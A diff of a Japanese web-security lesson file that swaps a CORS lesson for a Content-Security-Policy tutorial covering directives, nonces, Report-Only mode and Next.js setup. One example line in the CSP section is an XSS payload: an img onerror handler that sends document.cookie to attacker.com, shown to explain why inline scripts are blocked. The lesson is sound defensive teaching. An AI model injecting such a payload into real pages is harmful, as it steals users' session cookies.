@@ -1,425 +1,455 @@
-# lesson123: CORS の詳細
+# lesson122: Content-Security-Policy（CSP）実践
 
 ## ゴール
 
-- 同一オリジンポリシーと CORS（Cross-Origin Resource Sharing）の関係を説明できる
-- **シンプルリクエスト** と **プリフライト**（OPTIONS）の違いを区別できる
-- `Access-Control-Allow-Origin` / `Allow-Credentials` / `Allow-Headers` の使い分けが分かる
-- `credentials: "include"` と Cookie の絡みを理解する
-- よくある CORS エラーを **メッセージから即座に原因に到達** できる
+- CSP が **XSS の最後の砦** として何を防ぐか説明できる
+- `default-src` / `script-src` / `style-src` 等の主要ディレクティブを書ける
+- `nonce` / `hash` で **必要な inline script を許可** できる
+- `Content-Security-Policy-Report-Only` で本番に出す前の検証ができる
+- Next.js で CSP を **proxy + Middleware で動的に発行** できる
+
+::: tip 前提
+このレッスンは「Cookie と Web セキュリティ」の発展編です。XSS / CSRF の基本は「Cookie と Web セキュリティ」を確認してください。
+:::
 
 ## 解説
 
-### 同一オリジンポリシーの復習
+### CSP は最後の防衛線
 
-ブラウザは「**異なるオリジン** からの応答を JS に渡さない」という規則（同一オリジンポリシー）を持っています。
+XSS の理想は「**そもそも入力をエスケープして XSS を起こさない**」こと（「Cookie と Web セキュリティ」）。けれど、ライブラリのバグ / Markdown のレンダリング / 古い jQuery など、**完璧に守るのは難しい**。
 
-オリジン = `スキーム + ホスト + ポート`。
+Content-Security-Policy は「**仮に攻撃スクリプトが混入しても、ブラウザが読み込みを拒否する**」という二重の防衛線です。
 
-| URL A | URL B | 同一オリジン？ |
-|---|---|---|
-| `https://example.com` | `https://example.com/api` | はい |
-| `https://example.com` | `http://example.com` | **いいえ**（スキームが違う） |
-| `https://example.com` | `https://api.example.com` | **いいえ**（ホストが違う） |
-| `https://example.com:443` | `https://example.com:8080` | **いいえ**（ポートが違う） |
+仕組みは「**HTTP レスポンスヘッダ** で `<script>` / `<style>` / 画像 / fetch などの **読み込み元を許可リスト形式で指定**」。
 
-### CORS = 「異なるオリジンからの読み取りを **明示的に許可**」
-
-API がブラウザから直接呼ばれる現代では、別オリジンから読みたい場面が多発します。CORS は「**サーバー側がレスポンスヘッダで許可を出した時** に限り、ブラウザが JS にレスポンスを渡す」仕組みです。
-
-ポイント:
-
-- **送信は誰でもできる**（リクエスト自体はブラウザが送る）
-- **応答を JS が読めるかどうか** は CORS ヘッダ次第
-- だから **CSRF とは別問題**（CSRF は送信を防ぐ話）
-
-### シンプルリクエスト
-
-GET / POST / HEAD で、**ヘッダが標準的なもの** だけのリクエストは、ブラウザが直接送信します。
-
-条件（ざっくり）:
-
-- メソッドは GET / POST / HEAD
-- カスタムヘッダなし
-- `Content-Type` は `application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain` のいずれか
-
-例:
-
-```js
-fetch("https://api.example.com/posts");
-```
-
-サーバーは応答に CORS ヘッダを返す:
+### 最小例
 
 ```http
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://my-site.example
-Content-Type: application/json
+Content-Security-Policy: default-src 'self';
 ```
 
-`Access-Control-Allow-Origin` がリクエスト元オリジンと一致 / `*` ならブラウザが JS に応答を渡す。一致しなければ **JS から読めずエラー**。
+これだけで:
 
-### プリフライト（OPTIONS）
+- 自分のドメイン以外からの **JS / CSS / 画像 / fetch** がブロックされる
+- inline script（`<script>...</script>`）も **デフォルト拒否**
+- inline style（`<div style="...">`）も拒否
 
-メソッドが PUT / DELETE / PATCH、または `Content-Type: application/json` のような **シンプルでない** リクエストは、ブラウザが **本リクエストの前に OPTIONS** を送って許可を確認します。
+なぜ inline まで拒否するのか:
 
-```
-OPTIONS /posts HTTP/1.1
-Origin: https://my-site.example
-Access-Control-Request-Method: PUT
-Access-Control-Request-Headers: Content-Type, Authorization
-```
-
-サーバーが応答:
-
-```
-HTTP/1.1 204 No Content
-Access-Control-Allow-Origin: https://my-site.example
-Access-Control-Allow-Methods: GET, POST, PUT, DELETE
-Access-Control-Allow-Headers: Content-Type, Authorization
-Access-Control-Max-Age: 3600
+```html
+<!-- 攻撃者が混入させたい -->
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)" />
 ```
 
-OPTIONS の応答が **OK + 適切なヘッダ** ならブラウザは本リクエストを送る。NG なら本リクエストは飛ばない。
+これを **inline script 全面禁止** にすると、たとえ XSS で混入しても **実行されません**。
 
-#### `Access-Control-Max-Age`
+### 主要ディレクティブ
 
-OPTIONS の結果を **キャッシュする秒数**。これがないとリクエストごとに OPTIONS が走って遅くなります。`3600`（1 時間）程度が目安。
-
-### 主要ヘッダ
-
-#### サーバー → ブラウザ（応答）
-
-| ヘッダ | 内容 |
+| ディレクティブ | 制御するリソース |
 |---|---|
-| `Access-Control-Allow-Origin` | 許可するオリジン（または `*`） |
-| `Access-Control-Allow-Methods` | 許可するメソッド |
-| `Access-Control-Allow-Headers` | 許可するリクエストヘッダ |
-| `Access-Control-Allow-Credentials` | Cookie / Authorization を含むリクエストを許可するか |
-| `Access-Control-Expose-Headers` | JS から読めるレスポンスヘッダの追加リスト |
-| `Access-Control-Max-Age` | プリフライトのキャッシュ秒 |
+| `default-src` | 他で指定がないリソース全部のフォールバック |
+| `script-src` | JavaScript |
+| `style-src` | CSS |
+| `img-src` | `<img>` |
+| `font-src` | フォント |
+| `connect-src` | `fetch` / `XMLHttpRequest` / `WebSocket` |
+| `frame-src` | `<iframe>` |
+| `media-src` | `<audio>` / `<video>` |
+| `object-src` | `<object>` / `<embed>`（`'none'` 推奨） |
+| `base-uri` | `<base>` タグの `href` |
+| `form-action` | `<form>` の `action` |
+| `frame-ancestors` | 自分を `<iframe>` で **埋め込ませる相手**（Clickjacking 対策） |
 
-#### ブラウザ → サーバー（リクエスト）
+### ソース指定子
 
-| ヘッダ | 内容 |
+| 値 | 意味 |
 |---|---|
-| `Origin` | リクエスト元オリジン（**ブラウザが自動付与、JS から偽装不能**） |
-| `Access-Control-Request-Method` | プリフライト時の本来のメソッド |
-| `Access-Control-Request-Headers` | プリフライト時の本来のヘッダ |
+| `'self'` | 自分のオリジン |
+| `'none'` | すべて拒否 |
+| `'unsafe-inline'` | inline script / style を許可（**極力避ける**） |
+| `'unsafe-eval'` | `eval()` / `new Function()` 許可（**極力避ける**） |
+| `https:` | あらゆる HTTPS オリジン |
+| `https://example.com` | 個別オリジン |
+| `*.example.com` | サブドメインワイルドカード |
+| `'nonce-XXXXX'` | ランダムナンス付きの inline を許可 |
+| `'sha256-XXXX'` | 特定のハッシュ値の inline を許可 |
+| `'strict-dynamic'` | nonce/hash 付きの script から **動的に読み込まれた script** を許可 |
 
-### Cookie / 認証ヘッダを含めるには
+### inline script を許可する 3 つの方法
 
-デフォルトで `fetch` は **クロスオリジンで Cookie を送らない**。送る場合は **両側に追加設定** が必要です。
+「Google Analytics や OGP 系の inline `<script>` だけは動かしたい」場合の対応。
 
-#### クライアント側
+#### 1. `'unsafe-inline'`（NG）
 
-```js
-fetch("https://api.example.com/me", {
-  credentials: "include",   // Cookie / Authorization を送る
-});
+`Content-Security-Policy: script-src 'self' 'unsafe-inline';`
+
+→ **すべての inline を許可** してしまうので XSS を防げない。**最終手段**。
+
+#### 2. nonce（推奨）
+
+リクエストごとに **ランダムな文字列**（nonce）をサーバーで生成し:
+
+- ヘッダに `script-src 'nonce-abc123' 'self';`
+- `<script nonce="abc123">...</script>`
+
+両方が一致した script だけ実行される。**毎回違う値** なので攻撃者は予測できない。
+
+#### 3. hash
+
+inline script の **SHA-256 ハッシュ** を `script-src 'sha256-XXX'` で許可。**内容が固定** な inline 限定。
+
+### `'strict-dynamic'`
+
+nonce / hash で許可した script が **動的に追加した子 script** をすべて許可する仕組み。許可リストを長く書かずに済む。
+
+```
+script-src 'nonce-abc123' 'strict-dynamic';
 ```
 
-`credentials` の値:
+これが現代の **推奨ポリシー** です（Google が CSP Level 3 でプッシュ）。
 
-- `"omit"`: 送らない（デフォルトのクロスオリジン）
-- `"same-origin"`: 同一オリジンの時だけ送る（デフォルトの同一オリジン）
-- `"include"`: 常に送る（クロスオリジンでも）
+### `Report-Only` で先に検証
 
-#### サーバー側
+本番に正しい CSP をいきなり当てると **動かなくなるリスク** が高い。`Content-Security-Policy-Report-Only` を使うと:
+
+- ブラウザは **違反をブロックせず**
+- 違反を **`report-uri` / `report-to`** に POST してくれる
 
 ```
-Access-Control-Allow-Origin: https://my-site.example
-Access-Control-Allow-Credentials: true
+Content-Security-Policy-Report-Only:
+  default-src 'self';
+  report-uri /csp-report;
+  report-to csp-endpoint;
 ```
-
-**重要な制約**:
-
-- `Allow-Credentials: true` の時、`Allow-Origin: *` は **使えない**。**具体的なオリジン** を返す必要がある
-- `Access-Control-Allow-Origin` に複数のオリジンは並べられない（`*` か **1 つだけ**）
-
-複数許可したい場合は **リクエストの Origin を見て動的に返す**:
 
 ```ts
-const allowed = [
-  "https://my-site.example",
-  "https://staging.example",
-  "http://localhost:3000",
-];
-
-export async function GET(req: Request) {
-  const origin = req.headers.get("Origin") ?? "";
-  const headers = new Headers({ "Content-Type": "application/json" });
-  if (allowed.includes(origin)) {
-    headers.set("Access-Control-Allow-Origin", origin);
-    headers.set("Access-Control-Allow-Credentials", "true");
-    headers.set("Vary", "Origin");
-  }
-  return new Response(JSON.stringify({ ok: true }), { headers });
+// app/api/csp-report/route.ts
+export async function POST(req: Request) {
+  const body = await req.json();
+  console.log("CSP violation:", body);
+  return new Response(null, { status: 204 });
 }
 ```
 
-`Vary: Origin` を入れると **CDN がオリジン別にキャッシュ** してくれます。これがないと、別オリジンのキャッシュを別の人に返してしまう事故が起きます。
+数日〜数週間ログを集めて、漏れなく許可リストを揃えてから **本番ヘッダ** に切り替えます。
 
-### Cookie 側の `SameSite`
+Sentry や Datadog の **CSP レポート機能** を使うとダッシュボードで一覧できます。
 
-「クロスオリジンで Cookie を送る」には Cookie 側の **`SameSite`** 属性も `None`（+ `Secure`）でないといけません。
+### Next.js での実装
 
-```
-Set-Cookie: session=abc; SameSite=None; Secure; HttpOnly; Path=/
-```
-
-- `SameSite=Strict`: クロスサイトには絶対送らない
-- `SameSite=Lax`: トップレベルナビゲーションでは送る（デフォルト）
-- `SameSite=None`（+ Secure）: クロスサイトでも送る（同意必要）
-
-これをセットで考えないと、CORS 設定だけ整えても **Cookie が飛ばずログイン状態が維持されない** 事故になります。
-
-### Next.js / Express での設定例
-
-#### Next.js（Route Handler）
+#### 静的なポリシー（next.config.ts のヘッダ）
 
 ```ts
-// app/api/posts/route.ts
-import { NextResponse } from "next/server";
+// next.config.ts
+import type { NextConfig } from "next";
 
-const ALLOWED_ORIGINS = [
-  "http://localhost:3000",
-  "https://my-site.example",
-];
+const cspHeader = `
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+`.replace(/\s{2,}/g, " ").trim();
 
-function corsHeaders(origin: string | null): HeadersInit {
-  const isAllowed = origin && ALLOWED_ORIGINS.includes(origin);
-  const headers: Record<string, string> = {
-    "Access-Control-Allow-Credentials": "true",
-    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
-    "Access-Control-Allow-Headers": "Content-Type, Authorization",
-    "Access-Control-Max-Age": "3600",
-    "Vary": "Origin",
-  };
-  // 許可されていないオリジンには Allow-Origin ヘッダ自体を返さない
-  // （空文字を返すとブラウザは「許可なし」だがプロキシ / CDN のキャッシュ汚染源になる）
-  if (isAllowed) {
-    headers["Access-Control-Allow-Origin"] = origin!;
-  }
-  return headers;
+const nextConfig: NextConfig = {
+  async headers() {
+    return [
+      {
+        source: "/:path*",
+        headers: [
+          { key: "Content-Security-Policy", value: cspHeader },
+          { key: "X-Frame-Options", value: "DENY" },
+          { key: "X-Content-Type-Options", value: "nosniff" },
+          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+        ],
+      },
+    ];
+  },
+};
+
+export default nextConfig;
+```
+
+::: warning Next.js は inline をたくさん使う
+Next.js は SSR したマークアップに **inline script を埋め込んで** ハイドレーションを行います。Tailwind v3 までの開発ビルドや next/script の inline モードも inline style / script を生成します。
+
+そのため `'unsafe-inline'` 抜きの厳格な CSP を当てるには **nonce 方式** が必須。
+:::
+
+#### 動的なポリシー（Proxy + nonce）
+
+Next.js 16 では `proxy.ts`（旧 middleware.ts）でリクエスト時に nonce を生成し、ヘッダで配ります。
+
+```ts
+// proxy.ts
+import { NextResponse, type NextRequest } from "next/server";
+
+export function proxy(req: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const csp = `
+    default-src 'self';
+    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
+    style-src 'self' 'nonce-${nonce}';
+    img-src 'self' data: https:;
+    font-src 'self';
+    connect-src 'self';
+    frame-ancestors 'none';
+    base-uri 'self';
+    form-action 'self';
+    upgrade-insecure-requests;
+  `.replace(/\s{2,}/g, " ").trim();
+
+  const requestHeaders = new Headers(req.headers);
+  requestHeaders.set("x-nonce", nonce);
+  requestHeaders.set("Content-Security-Policy", csp);
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  response.headers.set("Content-Security-Policy", csp);
+
+  return response;
 }
 
-export async function OPTIONS(req: Request) {
-  return new NextResponse(null, {
-    status: 204,
-    headers: corsHeaders(req.headers.get("Origin")),
-  });
-}
+export const config = {
+  matcher: [
+    "/((?!api|_next/static|_next/image|favicon.ico).*)",
+  ],
+};
+```
 
-export async function GET(req: Request) {
-  return NextResponse.json({ posts: [] }, {
-    headers: corsHeaders(req.headers.get("Origin")),
-  });
+#### Server Component で nonce を読む
+
+```tsx
+// app/layout.tsx
+import { headers } from "next/headers";
+import Script from "next/script";
+
+export default async function RootLayout({ children }: { children: React.ReactNode }) {
+  const nonce = (await headers()).get("x-nonce") ?? undefined;
+
+  return (
+    <html lang="ja">
+      <body>
+        {children}
+        <Script
+          src="https://example.com/analytics.js"
+          nonce={nonce}
+          strategy="afterInteractive"
+        />
+      </body>
+    </html>
+  );
 }
 ```
 
-#### Express の `cors` パッケージ
+`next/script` は **`nonce` prop** を渡すと自動で属性に反映してくれます。
 
-```js
-import cors from "cors";
+### Trusted Types
 
-app.use(
-  cors({
-    origin: ["https://my-site.example", "http://localhost:3000"],
-    credentials: true,
-    maxAge: 3600,
-  }),
-);
+CSP の進化版が **Trusted Types**。`document.innerHTML = userInput` のような **危険な代入** を **型レベル** で禁止します。
+
+```
+Content-Security-Policy: require-trusted-types-for 'script';
 ```
 
-### よくある CORS エラーと原因
+未対応ブラウザ（Safari）でも壊れずに、対応ブラウザでさらに守りが厚くなる。**新規プロジェクトは Trusted Types を入れる** が 2026 年の推奨。
 
-ブラウザのコンソールに出るメッセージ別の対処。
+### 確認ツール
 
-#### `No 'Access-Control-Allow-Origin' header is present on the requested resource`
+- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)（Google 提供）: 自分の CSP がどれくらい強いかを採点
+- [Mozilla Observatory](https://observatory.mozilla.org/): CSP を含むセキュリティヘッダ全般を診断
+- ブラウザの DevTools → Network → ヘッダ表示
 
-→ サーバーがそもそも CORS ヘッダを返していない / OPTIONS で 4xx を返している。サーバー側設定を見直す。
+### CSP 以外のセキュリティヘッダ
 
-#### `The 'Access-Control-Allow-Origin' header has a value 'X' that is not equal to the supplied origin`
-
-→ `Allow-Origin` が **間違ったオリジン** を返している。動的に Origin を見て一致するものを返す。
-
-#### `The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'`
-
-→ `credentials: "include"` の時は **`*` ではなく具体的オリジン** を返す。
-
-#### `Method PUT is not allowed by Access-Control-Allow-Methods`
-
-→ `Allow-Methods` に PUT を追加。OPTIONS の応答に必ず含める。
-
-#### `Request header 'X-Custom' is not allowed by Access-Control-Allow-Headers`
-
-→ `Allow-Headers` にカスタムヘッダを追加。
-
-#### `Cookie が送られない`
-
-→ クライアント側 `credentials: "include"`、サーバー側 `Allow-Credentials: true`、Cookie の `SameSite=None; Secure` の **3 点セット** を確認。
-
-### CORS が要らないケース
-
-- **同一オリジンへのリクエスト**（`/api/...` のような相対パス）
-- **`<img>` / `<script>` / `<link>` での読み込み**（こちらは元から CORS で制限されない。代わりに **`crossorigin` 属性** で読み取り権限が変わる）
-- **サーバー → サーバー**（fetch がブラウザを通らない）
-
-「**バックエンドプロキシ経由にすれば CORS 不要**」も実用解。Next.js なら `app/api/...` で **自分のオリジンに薄いラッパー** を置く。
-
-### CORB / CORP / COEP / COOP
-
-似た名前の仕組みが他にもあります。混同しないように整理:
-
-| 名前 | 役割 |
+| ヘッダ | 役割 |
 |---|---|
-| **CORS** | クロスオリジンレスポンスを **JS に読ませるか** |
-| **CORB**（Cross-Origin Read Blocking） | ブラウザが Spectre 対策で内部的に行うレスポンス遮断 |
-| **CORP**（`Cross-Origin-Resource-Policy`） | リソース側が **誰に埋め込まれるか** を制限 |
-| **COEP**（`Cross-Origin-Embedder-Policy`） | 自ページが埋め込む素材に **CORP / CORS の表明** を強制 |
-| **COOP**（`Cross-Origin-Opener-Policy`） | window.opener 経由のクロスオリジン操作を制限 |
+| `Strict-Transport-Security` | HTTPS 強制 |
+| `X-Content-Type-Options: nosniff` | MIME スニッフィング無効化 |
+| `Referrer-Policy: strict-origin-when-cross-origin` | リファラーの漏洩抑制 |
+| `Permissions-Policy` | カメラ / マイク等の権限を制限 |
+| `Cross-Origin-Opener-Policy: same-origin` | Spectre 系対策 |
+| `Cross-Origin-Embedder-Policy: require-corp` | 同上 |
 
-通常のアプリで気にするのは **CORS だけ**。SharedArrayBuffer / WebAssembly Threads を使う高度なケースで COEP/COOP/CORP が必要になります。
+CSP と一緒に **これら 5〜6 個も設定** するのが現代の標準。Vercel ダッシュボード / Cloudflare の管理画面で **テンプレート** が用意されています。
+
+### よくある事故
+
+#### 1. Google Fonts / Google Tag Manager が動かない
+
+→ `script-src` / `style-src` / `font-src` / `connect-src` に Google のホストを許可する。具体的には `https://fonts.googleapis.com` / `https://fonts.gstatic.com` / `https://www.googletagmanager.com`。
+
+#### 2. Sentry / Datadog の送信が拒否される
+
+→ `connect-src` に Sentry のエンドポイントを追加
+
+#### 3. 開発時のホットリロードが拒否される
+
+→ 開発時は `connect-src` に `ws://localhost:*` を加える、または開発時は CSP を緩める分岐を入れる
+
+#### 4. iframe 埋め込みされる事故
+
+→ `frame-ancestors 'none'` で防ぐ（X-Frame-Options より上位の指定）
 
 ## 演習
 
 ### ゴール
 
-- 自前 API に対して CORS エラーを **出してから直す** 流れを体験する
-- プリフライトの OPTIONS が飛ぶことを観察する
+- Next.js プロジェクトに **動的 nonce CSP** を入れる
+- まず Report-Only で違反ログを取り、最終的に強制ヘッダに切り替える
 
-### 手順 1: API サーバー（Hono）
+### 手順 1: 新規プロジェクト
 
 ```bash
-mkdir cors-server
-cd cors-server
-npm init -y
-npm install hono @hono/node-server
+npx create-next-app@latest csp-sample --ts --app
+cd csp-sample
 ```
 
-`server.ts`:
+### 手順 2: Report-Only で開始
+
+`next.config.ts`:
 
 ```ts
-import { Hono } from "hono";
-import { serve } from "@hono/node-server";
+const reportOnlyCsp = `
+  default-src 'self';
+  script-src 'self' 'unsafe-inline';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data:;
+  connect-src 'self';
+  frame-ancestors 'none';
+  report-uri /api/csp-report;
+`.replace(/\s{2,}/g, " ").trim();
 
-const app = new Hono();
-
-app.get("/posts", (c) => c.json({ posts: ["a", "b", "c"] }));
-
-serve({ fetch: app.fetch, port: 4000 });
-console.log("API on http://localhost:4000");
+export default {
+  async headers() {
+    return [
+      {
+        source: "/:path*",
+        headers: [
+          { key: "Content-Security-Policy-Report-Only", value: reportOnlyCsp },
+          { key: "X-Frame-Options", value: "DENY" },
+          { key: "X-Content-Type-Options", value: "nosniff" },
+          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+        ],
+      },
+    ];
+  },
+};
 ```
 
-```bash
-npx tsx server.ts
-```
+### 手順 3: レポートエンドポイント
 
-### 手順 2: クライアント（別ポート）
-
-別ターミナルで:
-
-```bash
-npm create vite@latest cors-client -- --template vanilla-ts
-cd cors-client
-npm install
-npm run dev
-```
-
-`src/main.ts`:
+`app/api/csp-report/route.ts`:
 
 ```ts
-async function load() {
-  const res = await fetch("http://localhost:4000/posts");
-  const data = await res.json();
-  document.body.textContent = JSON.stringify(data);
+export async function POST(req: Request) {
+  const text = await req.text();
+  console.log("[CSP Report]", text);
+  return new Response(null, { status: 204 });
 }
-load();
 ```
 
-ブラウザで `http://localhost:5173`（Vite のデフォルトポート）を開くと、コンソールに **CORS エラー** が出るはずです。
+### 手順 4: わざと違反を起こす
 
+`app/page.tsx`:
+
+```tsx
+export default function Home() {
+  return (
+    <main style={{ padding: 24 }}>
+      <h1>CSP Demo</h1>
+      <img src="https://example.com/some-image.png" alt="" />
+      <iframe src="https://example.com" />
+    </main>
+  );
+}
 ```
-Access to fetch at 'http://localhost:4000/posts' from origin 'http://localhost:5173' has been blocked by CORS policy:
-No 'Access-Control-Allow-Origin' header is present on the requested resource.
-```
 
-### 手順 3: サーバーで CORS を許可
+`npm run dev` で開くと、外部画像 / iframe の読み込みが **CSP 違反** として検出され、サーバーログに `[CSP Report]` が出力されるはずです。違反は **ブロックされず**、画面は表示される（Report-Only のため）。
 
-`server.ts`:
+### 手順 5: 動的 nonce に切り替える
+
+`proxy.ts`:
 
 ```ts
-import { Hono } from "hono";
-import { serve } from "@hono/node-server";
-import { cors } from "hono/cors";
+import { NextResponse, type NextRequest } from "next/server";
 
-const app = new Hono();
+export function proxy(req: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const csp = `
+    default-src 'self';
+    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
+    style-src 'self' 'nonce-${nonce}';
+    img-src 'self' data:;
+    connect-src 'self';
+    frame-ancestors 'none';
+    upgrade-insecure-requests;
+  `.replace(/\s{2,}/g, " ").trim();
 
-app.use(
-  "*",
-  cors({
-    origin: ["http://localhost:5173"],
-    credentials: true,
-    allowMethods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
-    allowHeaders: ["Content-Type", "Authorization"],
-    maxAge: 3600,
-  }),
-);
+  const requestHeaders = new Headers(req.headers);
+  requestHeaders.set("x-nonce", nonce);
 
-app.get("/posts", (c) => c.json({ posts: ["a", "b", "c"] }));
-app.put("/posts/:id", (c) => c.json({ ok: true }));
+  const res = NextResponse.next({ request: { headers: requestHeaders } });
+  res.headers.set("Content-Security-Policy", csp);
+  return res;
+}
 
-serve({ fetch: app.fetch, port: 4000 });
+export const config = {
+  matcher: [
+    "/((?!api|_next/static|_next/image|favicon.ico).*)",
+  ],
+};
 ```
 
-再起動するとクライアントから読めるようになります。
+`app/layout.tsx`:
 
-### 手順 4: プリフライトを観察
+```tsx
+import { headers } from "next/headers";
+import Script from "next/script";
 
-PUT を呼ぶ:
-
-```ts
-await fetch("http://localhost:4000/posts/1", {
-  method: "PUT",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ title: "updated" }),
-});
+export default async function RootLayout({ children }: { children: React.ReactNode }) {
+  const nonce = (await headers()).get("x-nonce") ?? undefined;
+  return (
+    <html lang="ja">
+      <body>
+        {children}
+        <Script id="hello" nonce={nonce}>
+          {`console.log('hello with nonce')`}
+        </Script>
+      </body>
+    </html>
+  );
+}
 ```
-
-DevTools の Network タブで:
-
-1. まず **OPTIONS** が飛ぶ
-2. 200 / 204 が返る
-3. その後 **PUT** が飛ぶ
-
-を確認します。
 
 ### 期待出力
 
-- 最初は CORS エラー
-- サーバーで許可してから読める
-- PUT 時に **OPTIONS → PUT** の 2 段階のリクエストが見える
+- Report-Only モード: 違反は出るがブロックされず、サーバーに `[CSP Report]` ログ
+- 動的 nonce モード: `<script nonce="...">` を持つものだけ実行される
+- DevTools の Console に CSP 違反があると **赤い警告** が出る
 
 ### 変える
 
-- `Access-Control-Max-Age: 3600` を削除すると毎回 OPTIONS が飛ぶ
-- `credentials: true` を消した状態で `fetch(url, { credentials: "include" })` するとエラー
-- `allowOrigins` に `*` を入れると、`credentials` を使う場合だけエラー（仕様違反）
+- `script-src` の `'strict-dynamic'` を外して、サードパーティ script が読み込めなくなることを確認
+- `frame-ancestors 'none'` を `'self'` に変えて、自サイト内の iframe 埋め込みは許可
+- Trusted Types を有効化（`require-trusted-types-for 'script'`）して、`innerHTML = userInput` がエラーになることを観察
 
 ### 自分で書く（任意）
 
-- Next.js の Route Handler で同じ CORS 設定を再現する
-- `SameSite=None; Secure` の Cookie を使ってログインを成立させる
-- バックエンドプロキシ（Next.js の `/api/proxy`）を立てて、CORS を消す構成にする
+- Sentry / Datadog の送信が拒否されないよう、`connect-src` に該当エンドポイントを追加
+- Google Fonts を使うサイトで `style-src` / `font-src` / `connect-src` を整える
+- CSP Evaluator にヘッダを貼って **A 評価** を狙う
 
 ## まとめ
 
-- CORS は **「クロスオリジン応答を JS に読ませるかどうか」** をサーバーが許可する仕組み
-- **シンプルリクエスト** と **プリフライト**（OPTIONS） の 2 ルート
-- 主要ヘッダ: `Allow-Origin` / `Allow-Methods` / `Allow-Headers` / `Allow-Credentials` / `Max-Age`
-- **`credentials: "include"`** を使うなら、サーバー側で `Allow-Credentials: true` + 具体的なオリジン
-- **Cookie の `SameSite=None; Secure`** とセットで考える
-- 動的に Origin を見て返す時は **`Vary: Origin`** をつけて CDN を安全に
-- エラーメッセージから原因を特定できる定型パターンを覚える
-- 「バックエンドプロキシで CORS を消す」も実用解
+- CSP は **XSS の最後の砦**。攻撃 script が混入しても **読み込ませない**
+- `default-src 'self'` を起点に、必要に応じてディレクティブを追加
+- inline は **`'unsafe-inline'` を避け、nonce / hash + `'strict-dynamic'`** で許可
+- **`Content-Security-Policy-Report-Only`** で本番前に違反ログを集める
+- Next.js は **proxy** で nonce を発行し、`<Script>` の `nonce` prop で受け渡す
+- **Trusted Types** で `innerHTML = userInput` を型レベルで禁止
+- CSP と一緒に **STS / X-Content-Type-Options / Referrer-Policy / Permissions-Policy / COOP / COEP** も設定する
+- CSP Evaluator / Mozilla Observatory で診断
